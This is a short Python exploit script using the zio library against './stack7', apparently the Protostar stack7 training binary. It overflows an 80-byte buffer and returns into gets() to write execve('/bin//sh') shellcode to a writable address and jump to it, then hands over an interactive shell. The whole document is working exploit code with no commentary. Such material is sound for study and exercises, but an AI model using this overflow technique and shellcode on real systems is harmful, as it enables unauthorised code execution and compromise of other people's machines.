from zio import *
target  = './stack7'
c_read  = COLORED(RAW, 'green')
c_write = COLORED(RAW, 'blue')
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
io.gdb_hint([0x08048544])

plt_gets    = 0x080483a4
p_ret       = 0x08048493
adr_stage   = 0x08049000

shellcode = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
        )

payload1    = 'A' * 80
payload1    += l32(plt_gets)
payload1    += l32(p_ret)
payload1    += l32(adr_stage)
payload1    += l32(adr_stage)

io.read_until("input path please:")
io.writeline(payload1)
io.writeline(shellcode)

io.interact()
